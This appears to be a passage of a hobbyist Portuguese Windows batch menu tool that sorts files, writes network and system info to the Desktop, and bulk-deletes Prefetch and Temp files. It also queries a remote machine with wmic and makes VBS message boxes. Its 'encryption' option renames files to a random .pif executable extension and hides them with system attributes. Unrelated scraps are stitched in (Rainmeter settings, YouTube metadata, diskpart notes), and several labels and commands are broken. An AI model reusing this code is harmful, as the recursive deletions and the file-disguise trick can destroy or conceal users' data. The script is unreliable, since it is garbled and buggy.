move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


cd..

cd C:\Users\%username%\Videos

move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


  \m.vbs "processo concluido"

goto menu

:infpasta 

cls
COLOR 02
cd C:\Users\%username%\Desktop
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
cd C:\Users\%username%\Contacts
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Documents
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 02
cd C:\Users\%username%\Downloads
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Favorites
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
cd C:\Users\%username%\Links
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Music
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 02
cd C:\Users\%username%\Pictures
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 20
cd C:\Users\%username%\Searches
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
cd..
COLOR 02
cd C:\Users\%username%\Videos
DIR >> C:\Users\%username%\Desktop\ARQUIVOS.txt
COLOR 20

  \m.vbs "arquivo criado no Desktop"

goto menu


:infrede
cls
COLOR 24
@ echo off
title Informa็๕es da rede no windows
color 2
echo 1: PING concluido!
echo. 1: PING >> C:\Users\%username%\Desktop\info_rede.txt
ping www.google.com.br >> C:\Users\%username%\Desktop\info_rede.txt
echo. 
echo.
echo hora >> C:\Users\%username%\Desktop\ info_rede.txt
time /t >> C:\Users\%username%\Desktop\ info_rede.txt
echo data >> C:\Users\%username%\Desktop\ info_rede.txt
date /t >> C:\Users\%username%\Desktop\info_rede.txt
echo.
echo. 
echo 2: IPCONFIG
echo concluido!
echo.
echo 2: IPCONFIG >> C:\Users\%username%\Desktop\info_rede.txt
ipconfig >> C:\Users\%username%\Desktop\info_rede.txt
echo concluido!
echo. 
echo. 
echo 3: ARP
echo concluido! 
echo.
echo 3: ARP >> C:\Users\%username%\Desktop\info_rede.txt
arp -a >> C:\Users\%username%\Desktop\info_rede.txt
echo. 
echo.
echo 4: ROUTE PRINT
echo concluido!
echo.
echo 4: ROUTE PRINT >> C:\Users\%username%\Desktop\info_rede.txt
route print >> C:\Users\%username%\Desktop\info_rede.txt
echo.
echo.
echo 5: NETSTAT - Tabela de rotas
echo concluido!
echo.
echo 5: NETSTAT - Tabela de rotas >> C:\Users\%username%\Desktop\info_rede.txt
netstat -r >> C:\Users\%username%\Desktop\info_rede.txt
echo.
echo. 
echo 6: NETSTAT - Todas as conex๕es e portas de escuta
echo concluido!
echo.
echo 6: NETSTAT - Todas as conex๕es e portas de escuta >> C:\Users\%username%\Desktop\info_rede.txt
netstat -a >> C:\Users\%username%\Desktop\info_rede.txt
echo. 
echo. 
echo 7:NSLOOKUP
echo concluido!
echo.
echo 7:NSLOOKUP >> C:\Users\%username%\Desktop\info_rede.txt
nslookup %computername% >> C:\Users\%username%\Desktop\info_rede.txt
echo. 
echo.
echo 8: SYSTEMINFO
echo concluido!
echo.
echo 8: SYSTEMINFO >> C:\Users\%username%\Desktop\info_rede.txt
systeminfo >> C:\Users\%username%\Desktop\info_rede.txt
echo. 
echo.

echo 9:Memoria >> C:\Users\%username%\Desktop\info_rede.txt
MEM >> C:\Users\%username%\Desktop\info_rede.txt
echo.
echo.
echo Mem๓ria concluido!
echo 10: TRACERT
echo Aguarde um instante! Nao feche a janela ainda!
echo. 10: TRACERT >> C:\Users\%username%\Desktop\info_rede.txt
tracert www.google.com.br >> info_rede.txt
MSG * Processo concluido! Criado por DEDE WIZARD

pause

goto menu


:clean
cls
COLOR 50
start prefetch 
cd  C:\Windows\Prefetch
del * /s /q
cd..

start temp 
cd C:\Windows\Temp
del * /s /q
cd..

start %temp% 
cd C:\Users\%username%\AppData\Local\Temp
del *.* /s /q
cd..

CD C:\Users\%username%\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup
MD DEDE


m.vbs "limpesa completa"

goto menu
LINK MEUS DOCUMENTOS


:organizar

cls
@echo off
cls
COLOR 70
time /t
date /t
echo   *************************************************************
echo   ****         MOVENDO PARA AS PASTAS DE ORIGEM            ****
echo   ****                                                     ****
echo   *************************************************************
echo.   
echo.   
echo.   
echo.
SET /P nome1=Digite o caminho da pasta  

cd "%nome1%"
cd..
CD C:\Users\%username%\Documents
MD YUGIOH
cd "%nome1%"


move *.txt C:\Users\%username%\Downloads
move *.pdf C:\Users\%username%\Pictures
move *.bmp C:\Users\%username%\Pictures
move *.jpg C:\Users\%username%\Pictures
move *.png C:\Users\%username%\Pictures
move *.gif C:\Users\%username%\Pictures
move *.rar C:\Users\%username%\Downloads
move *.bat C:\Users\%username%\Downloads
move *.exe C:\Users\%username%\Downloads
move *.vbs C:\Users\%username%\Documentos
move *.zip C:\Users\%username%\Downloads
move *.mp3 C:\Users\%username%\Music
move *.wma C:\Users\%username%\Music
move *.html C:\Users\%username%\Downloads
move *.htm C:\Users\%username%\Downloads
move *.reg C:\Users\%username%\Downloads
move *.dll C:\Users\%username%\Downloads
move *.avi C:\Users\%username%\Videos
move *.rmvb C:\Users\%username%\Videoss
move *.flv C:\Users\%username%\Videos
move *.vob C:\Users\%username%\Videos
move *.nrg C:\Users\%username%\Videos
move *.CBR C:\Users\%username%\Downloads
move *.ydr C:\Users\%username%\Documents\YUGIOH
move *.ydc C:\Users\%username%\Documents\YUGIOH
move *.theme C:\Users\%username%\Documents
move *.themepack C:\Users\%username%\Documents\YUGIOH


m.vbs "MOVIDO COM SUCESSO"

GOTO MENU

1= C:\Users\%username%\Desktop

2= C:\Users\%username%\Documents

3= C:\Users\%username%\Downloads 

4= C:\Users\%username%\Music 

5= C:\Users\%username%\Pictures 

6= C:\Users\%username%\Videos 

7= C:\Users\%username%

8= C:\Users\%username%\Searches






:sair
m.vbs "XAAAAAUUUUUUU!!!!!!!!"
exit

LeftMouseDownAction=!Execute ["::{450D8FBA-AD25-11D0-98A8-0800361B1103}"]

{1A3EB677-F210-43AE-85B9-C6964FF59BF6}
------------------------------------------------------------------------------------------
LINK MEU COMPUTADOR

::{20D04FE0-3AEA-1069-A2D8-08002B30309D}
------------------------------------------------------------------------------

[Variables]
-> Folders

1="::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
2="C:\Users\%username%\"
3="C:\Users\%username%\Downloads"
4="C:\Users\%username%\Music"
5="C:\Users\%username%\Pictures"
6="C:\Users\%username%\Videos"
:VDISK
::===================CRIAR VIRTUAL DISCO==========================
Publicado em 19/07/2013
Inscreva-se se voc๊ gosta de windows (:
==============================
Chave: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlญญSet\services\Tcpip\Parameters

GlobalMaxTcpWindowSize
==============================
Categoria
Ci๊ncia e Tecnologia
Licen็a
Licen็a do YouTube Padrใo
=============================================================================

criar um virtual disco no diskpart 
disk part 
list disk
list patition
slect disco (principal ou c:)

creat vdisk file=e:\myvirtualdisk.vhd maximun 20000
select vdisk file=e:\myvirtualdisk.vhd
attach vdisk
list disk 

seleciona o virtual disco
format
creat patition primary
assign letter =v
list vdisk
detach vdisk
select vdisk file=e:\myvirtualdisk.vhd

=================================================================

echo.
set /p computador="digite o nome do computador:"
echo.
wmic /user:adiministrator /node:%computador% computersystem get username
echo.
goto MENU

::===================CRIAR VBS==========================

:vb
cls
color 3f
MODE 80,20
title         tipos de mensagens ////           ////          ////          ////                 
echo ออออออออออออออออออออออออออออออออออออออออออออออ
echo ออ (menu)volta para o inicio
echo ออ
echo ออ PARA VER A DEMONSTRACAO DIGITE demo
echo ออ  perigo
echo ออ  interrogacao
echo ออ  exclamacao
echo ออ  informacao
echo อออออออออออออออออออออออออออออออออออออออออออออ
set /p M=digite sua opcao ออ 
if %M% equ perigo goto pe
if %M% equ interrogacao goto int
if %M% equ exclamacao goto ex
if %M% equ informacao goto inf
if %M% equ DEMO goto demo
if %M% equ demo goto demo
if %M% equ MENU goto menu
if %M% equ menu goto menu
cls
::============================= perigo ======================================================
    
:pe
cls
title         tipos de mensagens ////     %M%          ////          ////         ////          
color 4f
cls
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   Mostra  ออ OK ออ
echo   Mostra ออ OkCancela ออ
echo   Mostra ออ AbortarTentarIgnorar ออ
echo   Mostra ออ SimNaoCance ออ
echo   Mostra ออ SimNao ออ
echo   Mostra ออ TentarCancelar ออ
echo   vb voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ


set /p B=digite sua opcao
if %B% equ ok goto c
if %B% equ ok cancela goto k
if %B% equ AbortarTentarIgnorar goto y
if %B% equ SimNaoCance goto gcls
if %B% equ SimNao goto nm
if %B% equ TentarCancelar goto b
if %B% equ vb goto vb

:c
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per

:k
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per1

:y
cls
ttitle         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per2

:g
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per3

:nm
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per4

:b
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto per5


          ::=====================================  interrogacao  ==============================================




:int
cls
color 1f

title         tipos de mensagens ////     %M%      ////          ////           ////      
color 4f
cls
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   Mostra  ออ OK ออ
echo   Mostra ออ OkCancela ออ
echo   Mostra ออ AbortarTentarIgnorar ออ
echo   Mostra ออ SimNaoCance ออ
echo   Mostra ออ SimNao ออ
echo   Mostra ออ TentarCancelar ออ
echo   vb voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ

set /p B=digite sua opcao
if %B% equ ok goto i1
if %B% equ OkCancela goto i2
if %B% equ AbortarTentarIgnorar goto i3
if %B% equ SimNaoCance goto i4
if %B% equ TentarCancelar goto i5
if %B% equ vb goto i6
if %B% equ %B% goto vb

:i1
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte1

:i2
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte2

:i3
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte3

:i4
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte4

:i5
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte5

:i6
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inte6

::==============================  exclamacao  =====================================================



     
:ex
cls
title         tipos de mensagens ////     %M%          ////              ////             ////  
color 4f
cls
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   Mostra  ออ OK ออ
echo   Mostra ออ OkCancela ออ
echo   Mostra ออ AbortarTentarIgnorar ออ
echo   Mostra ออ SimNaoCance ออ
echo   Mostra ออ SimNao ออ
echo   Mostra ออ TentarCancelar ออ
echo   vb voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
if %B% equ OK goto e1
if %B% equ OkCancela goto e2
if %B% equ AbortarTentarIgnorar goto e3
if %B% equ SimNaoCance goto e4
if %B% equ SimNao goto e5
if %B% equ TentarCancelar goto e6
if %B% equ vb goto vb

:e1
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc1

:e2
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc2

:e3
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc3

:e4
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc4

:e5
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc5

:e6
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto exc6

::==================================  lnformacao  =================================================





     

:inf
cls
color 5b
title         tipos de mensagens ////     %M%          ////              ////             ////  
cls
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   Mostra  ออ OK ออ
echo   Mostra ออ OkCancela ออ
echo   Mostra ออ AbortarTentarIgnorar ออ
echo   Mostra ออ SimNaoCance ออ
echo   Mostra ออ SimNao ออ
echo   Mostra ออ TentarCancelar ออ
echo   vb voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p B=digite sua opcao
if %B% equ OK goto in1
if %B% equ OkCancela goto in2
if %B% equ AbortarTentarIgnorar goto in3
if %B% equ SimNaoCance goto in4
if %B% equ SimNao goto in5
if %B% equ TentarCancelar goto in6
if %B% equ vb goto vb



:in1
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf1

:in2
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf2

:in3
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf3

:in4
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf4

:in5
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf5

:in6
cls
title         tipos de mensagens ////     %M%      ////     %B%     ////                 //// 
set /p nome1=digite o nome da janela
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  //// 
set /p nome2=digite o nome do aquivo
title         tipos de mensagens ////     %M%      ////     %B%     ////  %nome1%  ////  %nome2%
set /p  nome=digite sua mensagem
goto inf6


::==========================  criando mensagens  =========================================================

 MODE 20,3     

    ::perigo

:per
echo MsgBox "%nome%",vbOKOnly + vbCritical, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
:per1
echo MsgBox "%nome%",vbOKCancel + vbCritical, "%nome1%" >>"%nome2%".vbs
 msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
:per2
echo MsgBox "%nome%",vbAbortRetryIgnore + vbCritical, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
:per3
echo MsgBox "%nome%",vbYesNoCancel + vbCritical, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
:per4
echo MsgBox "%nome%",vbYesNo + vbCritical, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
:per5
echo MsgBox "%nome%",vbRetryCancel + vbCritical, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
::=========================  interrogacao  ==========================================================
MODE 20,3
:inte1
cls
echo MsgBox "%nome%",vbOKOnly + vbQuestion, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inte2   
echo MsgBox "%nome%",vbOKCancel + vbQuestion, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inte3 
echo MsgBox "%nome%",vbAbortRetryIgnore + vbQuestion, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inte4  
echo MsgBox "%nome%",vbYesNoCancel + vbQuestion, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inte5  
echo MsgBox "%nome%",vbYesNo + vbQuestion, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inte6  
echo MsgBox "%nome%",vbRetryCancel + vbQuestion, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
::============================  exclamacao  =======================================================
  
MODE 20,3 
:exc1
cls
echo MsgBox "%nome%",vbOKOnly + vbExclamation, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb

 
:exc2  
echo MsgBox "%nome%",vbOKCancel + vbExclamation, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb

 
:exc3  
echo MsgBox "%nome%",vbAbortRetryIgnore + vbExclamation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:exc4  
echo MsgBox "%nome%",vbYesNoCancel + vbExclamation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb

 
:exc5  
echo MsgBox "%nome%",vbYesNo + vbExclamation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb

 
:exc6  
echo MsgBox "%nome%",vbRetryCancel + vbExclamation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  
::=============================  informacao  ======================================================

MODE 20,3
 
:inf1
cls
echo MsgBox "%nome%",vbOKOnly + vbInformation, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inf2  
echo MsgBox "%nome%",vbOKCancel + vbInformation, "%nome1%" >>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inf3  
echo MsgBox "%nome%",vbAbortRetryIgnore + vbInformation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inf4  
echo MsgBox "%nome%",vbYesNoCancel + vbInformation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inf5  
echo MsgBox "%nome%",vbYesNo + vbInformation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
 
:inf6  
echo MsgBox "%nome%",vbRetryCancel + vbInformation, "%nome1%">>"%nome2%".vbs
msg * /time 5 "%nome2%"criado com sucesso
goto vb
  


::=========================  demostrcao  ==========================================================

MODE 20,3

:demo
echo MsgBox  "sua mensagem",vbOK + vbInformation,"nome da janela" > test.vbs
msg * /time 5 DEMONSTRAcao criado com sucesso
goto vb



::===================================================================================



:en 
::===================encriptar dados==========================
MODE 20,3
cls
color 0a
title.     Scripts ( js ) Scripts
mode 75,20
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   1 ^<= Criptografa Arquivo
echo.
echo   2 ^<= Descriptografa Arquivo
echo.
echo   3 ^<= Esconder Arquivo ou pasta
echo.
echo   4 ^<= Mostrar arquivo ou pasta
echo.
echo   5 ^<= Menu Principal
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p me= Comando=^> 
if %me% == 1 goto 3
if %me% == 2 goto 4
if %me% == 3 goto 1
if %me% == 4 goto 2
if %me% == 5 goto 5
if %me% == 6 goto 6
msg * /time 6 ( %me% ) nฦo  um comando valido digite de 1a 4 
goto en
:1
cls
mode 75,7
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p j= Araste arquivo ou pasta e solte Aqui...
attrib %j% +h +s
goto en
:2
cls
mode 75,200
dir /a /p /o /t
dir /a /p /o /t >> %past%\ocult.txt
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

set /p sk= Digite ou cole o nome doarquivo com . extencao=^> 
attrib "%sk%" -h -s
del ocult.txt
goto en

:3
echo msgbox "Dica veja que no final do texto vai ser mostrado o nome do arquivo e o ponto . exten็ใo Recomendo que ap๓s camufla o arquivo coloque a exten็ใo no nome do mesmo se voc๊ esquecer pode ver a exten็ใo lแ no nome",vbinformation,"Lembrete Aten็ใo" > %temp%\jj.vbs
 start %temp%\jj.vbs
cls
mode 75,7
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p s= Araste o seu arquivo e solte aqui...
ren %s% %random%.pif
msg * /time 7 Seu arquivo fio Criptografado com sucesso...
goto en
:4
mode 75,7
cls
echo                 Sempre Apขs um comando Pressione=^> ENTER
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p ex= Digite a verdadeira extencao do arquivo sem o ponto . =^> 
attrib %temp%\ex.cmd -h
echo. > %temp%\ex.cmd
echo @echo off >> %temp%\ex.cmd
echo color 0a >> %temp%\ex.cmd
echo mode 75,7 >> %temp%\ex.cmd
echo title.    Descriptografando arquivo ( js ) Scripts >> %temp%\ex.cmd
echo echo                 Sempre Ap^ขs um comando Pressione=) ENTER >> %temp%\ex.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> %temp%\ex.cmd
echo set /p s2=  Araste o seu arquivo e solte aqui... >> %temp%\ex.cmd
echo ren %%s2%% %%random%%.%ex% >> %temp%\ex.cmd
echo msg * /time 7 Seu arquivo ja pode ser acessado.... >> %temp%\ex.cmd
echo exit >> %temp%\ex.cmd
start %temp%\ex.cmd
attrib %temp%\ex.cmd +h 
cls 
goto en
:5
goto menu
:in
   

IF EXIST CORES.cmd ( goto end )else ( goto md
md
)

:md
echo @echo off >> CORES.cmd

echo color 0a >> CORES.cmd

echo CLS >> CORES.cmd
echo date /t >> CORES.cmd
echo time /t >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo. >> CORES.cmd
echo echo    ESCOLHA A COR DE SUA PREFERENCIA >> CORES.cmd
echo echo. >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd
echo echo  0 = Preto        8 = Cinza >> CORES.cmd
echo echo  1 = Azul         9 = Azul claro >> CORES.cmd
echo echo  2 = Verde        A = Verde claro >> CORES.cmd
echo echo  3 = Verde- gua   B = Verde- gua cl ro >> CORES.cmd
echo echo  4 = Vermelho     C = Vermelho claro >> CORES.cmd
echo echo  5 = Roxo         D = Lil s >> CORES.cmd
echo echo  6 = Amarelo      E = Amarelo claro >> CORES.cmd
echo echo  7 = Branco       F = Branco brilhante >> CORES.cmd
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออ >> CORES.cmd

echo ping 127.0.0.1 -n 2 ^> nul >> CORES.cmd
echo color 1f >> CORES.cmd


echo CLS >> CORES.cmd
